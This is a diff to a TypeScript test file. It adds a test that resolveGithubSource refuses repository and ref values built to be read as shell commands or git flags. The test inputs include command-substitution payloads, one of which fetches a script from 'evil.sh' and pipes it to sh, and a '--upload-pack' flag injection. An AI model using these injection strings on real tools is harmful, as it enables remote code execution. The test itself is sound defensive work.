@@ -1,7 +1,11 @@
 import * as fs from "node:fs/promises";
 import * as path from "node:path";
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
-import { formatSourceString, resolveLocalSource } from "../../src/core/source.js";
+import {
+  formatSourceString,
+  resolveGithubSource,
+  resolveLocalSource,
+} from "../../src/core/source.js";
 import type { Source } from "../../src/schemas/lockfile.js";
 
 // =============================================================================
@@ -624,6 +628,21 @@ describe("findCanonicalRepo (via resolveLocalSource without explicit path)", () 
 // the closely related resolveLocalSource, which has the same output structure.
 
 describe("resolveGithubSource", () => {
+  // A canonical repo's release tag, and a lockfile's `repository`, both reach a
+  // subprocess argument list. These assert the guards are actually WIRED at the
+  // sink — the validators' own unit tests can't catch the wiring being removed.
+  it("refuses a repository or ref that could be read as a shell command or a flag", async () => {
+    await expect(
+      resolveGithubSource({ repository: "acme/$(curl evil.sh|sh)" }, "/tmp/nope"),
+    ).rejects.toThrow(/owner\/repo format/);
+    await expect(
+      resolveGithubSource({ repository: "acme/standards", ref: "v1.0.0$(id)" }, "/tmp/nope"),
+    ).rejects.toThrow(/Invalid ref/);
+    await expect(
+      resolveGithubSource({ repository: "acme/standards", ref: "--upload-pack=evil" }, "/tmp/nope"),
+    ).rejects.toThrow(/Invalid ref/);
+  });
+
   it.skip("requires network access - tested via integration tests", () => {
     // resolveGithubSource clones a GitHub repository, which needs network.
     // Integration tests should cover:
